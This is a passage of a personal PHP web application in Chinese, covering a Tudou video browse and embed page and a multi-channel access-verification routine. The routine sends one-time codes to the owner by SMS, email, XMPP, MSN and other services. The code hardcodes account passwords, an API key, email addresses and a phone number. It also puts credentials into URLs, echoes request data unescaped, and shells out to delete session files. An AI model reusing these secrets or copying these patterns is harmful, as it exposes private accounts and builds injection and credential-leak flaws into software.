                        }
                        ?>
                        <OPTION VALUE="">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediatime" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediatime = $tudou_media->tudoumediatime();
			?>
                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">播放时间</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediatime);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediatime[$i]['time'];?>" <?php  if (trim(request('mediatime')) == $mediatime[$i]['time']) echo 'selected';?>><?php  echo $mediatime[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediatype" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediatype = $tudou_media->tudoumediatype();
			?>
                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">媒体类型</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediatype);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediatype[$i]['type'];?>" <?php  if (trim(request('mediatype')) == $mediatype[$i]['type']) echo 'selected';?>><?php  echo $mediatype[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediaorder" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaorder = $tudou_media->tudoumediaorder();
			?>
                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">媒体排序</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediaorder);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediaorder[$i]['order'];?>" <?php  if (trim(request('mediaorder')) == $mediaorder[$i]['order']) echo 'selected';?>><?php  echo $mediaorder[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">默认...</OPTION>
                        </SELECT>

                        <input type="text" name="pagesize" value="<?php echo $pagesize?>" style="width:19px;height:19px;font-size:12px" <?php  $style->textarea("#FCFC9D","") ?>>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>" size="1"> 
                        <input type="submit" class="button" name="btnSubmit" value=" Go ">
                        <?php 
                      	if($_SESSION["tudou"]["uname"] != '' && $_SESSION["tudou"]["pwd"] != ''){
                      	?>
                        &nbsp;<a style="color:#000000" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a>
                      	<?php 	
                      	}	
                        else{
                        ?>
                        &nbsp;<a  style="color:#000000" href="?api=tudou&action=<?php echo encodeuri('media.login');?>&skin=<?php echo $skincolor;?>" title="上传视频到土豆服务器">登入</a>
                        <?php 
                      	}
                        ?>
                </td>
        </tr>   
</table>
                        <?php 
    		    		       	$tudou_media = new tudou_class();
		    		           	$mediainfo = $tudou_media->tudoumediaiteminfo(trim(request('mediacode')));
		    		           	//print_r($mediainfo);
		    		           	//return;
												?>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"><?php echo $mediainfo['mediatitle'];?> <A style="color:#000000" HREF='<?php echo trim($_SERVER['HTTP_REFERER']);?>'>返回</A></td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"><?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> [  <a style="color:#000000" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">退出</a> ] <?php  } ?></td>
        </tr>
</table>
<table width="95%" height="75%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" valign="center" colspan="3">
<table align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3">
									<embed src="http://www.tudou.com/v/<?php echo trim(request('mediacode'));?>/&cbs=2&vbc=9&autoPlay=true/v.swf" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" autostart='true' controls='console' volume="100" wmode="opaque" width="600" height="450"></embed> 
                </td>
        </tr>
</table>
								</td>
        </tr>
</table>
	  		<?php 
	  		
                break;
        default:
                      	if($_SESSION["tudou"]["uname"] != '' && $_SESSION["tudou"]["pwd"] != ''){
	                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".trim('media.ulist')."&checkcode=".trim(request("checkcode")));
	                    		return;
	                    	}	
    
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=tudou&action=<?php  echo encodeuri("media.ulist");?>&skin=<?php  echo $skincolor;?>" method="post" name="tudou">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>> 
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
               </td>
        </tr>   
</table>
<?php               
                break;          
}
$style->footer();
exit;
}
?>

<?php 
function xmpphp(){

#Use XMPPHP_Log::LEVEL_VERBOSE to get more logging for error reports
#If this doesn't work, are you running 64-bit PHP with < 5.2.6?
$conn = new XMPPHP_XMPP('talk.google.com', 5222, 'x3193@g.x3193.tk', 'EUIfgwe7', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
try {
    $conn->connect();
    $conn->processUntil('session_start');
    $conn->presence();
    $conn->message('xcy6272003@gmail.com', iconv('gb2312','utf-8','This is a test message!'.trim(request('msg'))));
    $conn->disconnect();
} 
catch(XMPPHP_Exception $e) {
    die($e->getMessage());
}

}
?>

<?php 
function blank(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');

$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 验证");
$ipverify = 'n'; // y or n 单纯IP验证
$smsverify = 'y'; // y or n 纯短信认证
//echo $smsverify;
//echo $ipowner.'gg';   
$IPFilter = new IPFilter('');
$ipallow = $IPFilter->IPlimiter();
$redirecturl = syssetini().'&serverip='.trim($_SERVER['SERVER_NAME'])."&verify=";
$iplimiter = arrmember(checkip($ipallow,$redirecturl),'1');
$verifymethod = 'fetion';
//echo $iplimiter.'fffffl';

//echo $_SESSION["X3193"]['global'][$iplimiter]['verify']['success'].' '.$_COOKIE["X3193"]['global'][$iplimiter]['verify']['success'];
//exit;

if (strtolower(trim(request('verify'))) != 'fetion' && strtolower(trim(request('verify'))) != 'sendcloud' && strtolower(trim(request('verify'))) != 'xmpp' && strtolower(trim(request('verify'))) != 'gcal' && strtolower(trim(request('verify'))) != 'sim' && strtolower(trim(request('verify'))) != 'msn' && strtolower(trim(request('verify'))) != 'email' && strtolower(trim(request('verify'))) != 'gtalk' && strtolower(trim(request('verify'))) != 'voxeo' && strtolower(trim(request('verify'))) != 'yahoo') {
		//redirect($redirecturl);
		//union_redirect($redirecturl);
		//session_write_close();		
		//session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
		//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
		//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
		//ini_set('session.gc_divisor',1);
		//session_start();
		//session_destroy();	
		passthru("find /var/lib/openshift/5419a3585004461665000be4/php/sessions/ -type f -empty -delete",$result);	
   	return;      
}
elseif($verifymethod != strtolower(trim(request('verify')))){
		//session_destroy();	
		passthru("find /var/lib/openshift/5419a3585004461665000be4/php/sessions/ -type f -empty -delete",$result);		
   	return;
}

//echo $verifymethod . strtolower(trim(request('verify')));

if(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) == '' && strtoupper(trim(request('msgverifycode'))) == ''){

session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}

$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = '';
unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
//unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']);
//unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']);
setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", "",time() + 3600*24*31, "/", ".".$_SERVER['SERVER_NAME'], 1);
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))] = randcode(32,'');
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] = randcode(8,'number');

        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        	
        }
        else{
       	
      if (strtolower(trim(request('verify'))) == 'sim'){
                  //mail('xcy6272003@126.com','X3193正在验证您的访问权限','本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193正在验证您的访问权限', '本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！','gb2312');
				      		$voxeo = new voxeo_class();
                  $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','The code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);        
      }   
      elseif (strtolower(trim(request('verify'))) == 'email'){

                  //mail('xcy6272003@126.com','X3193正在验证您的访问权限','本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193正在验证您的访问权限', '本次验证地址为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'，IP地址为：'.$_SERVER['REMOTE_ADDR'],'gb2312');
     }   
      elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193正在验证您的访问权限'),
              'html' => iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //echo $result;
  	  }      
      elseif (strtolower(trim(request('verify'))) == 'xmpp'){
         $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
             $conn->connect();
             $conn->processUntil('session_start');
             $conn->presence();
             $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
             $conn->disconnect();
      }   
      elseif (strtolower(trim(request('verify'))) == 'msn'){
					$sendMsg = new sendMsg();
					$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
					//echo $sendMsg->result.' '.$sendMsg->error;
      }   
      elseif (strtolower(trim(request('verify'))) == 'smtp'){
				$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        $smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','X3193正在验证您的访问权限'), iconv('gb2312','gb2312','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
      }      
      elseif (strtolower(trim(request('verify'))) == 'gcal'){
              	$google_calendar = new google_class();
              	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
        				$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('X3193正在验证您的访问权限,本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'IP地址为：'.$_SERVER['REMOTE_ADDR']),trim('X3193登录验证'),trim('X3193登录验证模块'));
      }
      elseif (strtolower(trim(request('verify'))) == 'voxeo'){
   					 $voxeo = new voxeo_class();
             $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      }
      elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));	// 接收人手机号、飞信内容      	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      }      
      redirect(httppath().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=');
		}
}
elseif(trim(request('verify')) != '' && trim(request('verifycode')) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) == ''){
        
session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}
        
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
      		echo $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'];
        }
        else{
	//echo trim($_SERVER["SERVER_NAME"]);        	
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">

<table width="95%" height="89" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="">
        <tr>
                <td align="center" valign='middle'>
                        <form action="<?php  echo httppath().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=';?>" method="post" name="dnspod">
                        &nbsp短信验证码：<input type="text" class="text" name="msgverify" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>

<?php         
        }
}
elseif(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) != '' && strlen(trim(request('msgverify'))) == '8'){

session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}

            if($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))] == trim(request('verifycode')) && $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] == trim(request('msgverify')) ){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        }
                        else{
     	 if (strtolower(trim(request('verify'))) == 'sim'){
                              //mail('xcy6272003@126.com','X3193已经成功验证了您的访问权限','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193已经成功验证了您的访问权限', '本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
            		$voxeo = new voxeo_class();
                        $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Success! The verification code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                              
                      }        
            elseif (strtolower(trim(request('verify'))) == 'email'){
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193已经成功验证了您的访问权限', '本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                      } 
      			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193.TK已经成功验证了您的访问权限'),
              'html' => iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  			}                              
            elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
             	
            }   
      			elseif (strtolower(trim(request('verify'))) == 'smtp'){
							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','本次登陆验证成功！'), iconv('gb2312','gb2312','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
     				}            
            elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'yahoo'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'xmpp'){
               $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                   $conn->connect();
                   $conn->processUntil('session_start');
                   $conn->presence();
                   $conn->message('x3193@g.x3193.cz.cc', iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                   $conn->disconnect();
                 
            } 
      			elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
      			}               
            elseif (strtolower(trim(request('verify'))) == 'gcal'){
                    	$google_calendar = new google_class();
                    	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('本次登陆验证成功！,本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].'IP地址为：'.$_SERVER['REMOTE_ADDR']),trim('X3193登录验证'),trim('X3193登录验证模块'));
            }
            elseif (strtolower(trim(request('verify'))) == 'voxeo'){
               $voxeo = new voxeo_class();
                         $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }
       			elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
    	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      			}            
         }
                   			unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
                   			unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
                                      
                   			$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = randcode(32,'');
                   			unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
                   			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", "", time() + 3600*24*31, "/", ".".$_SERVER['SERVER_NAME'], 1);
              		 			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'], time() + 3600*24*31);
              		 			
              		 			//echo trim($_SERVER["SERVER_NAME"]).' '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' 1111 '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
              		 			//exit;
         				if (is_wap()){
                   				redirect(httppath());
                   			}else{
                   				redirect(httppath());                   			
                   			}
                        break;
                }
                else{
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        }
                        else{
            if (strtolower(trim(request('verify'))) == 'sms'){
                                   //mail('xcy6272003@126.com','X3193验证您的访问权限失败','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
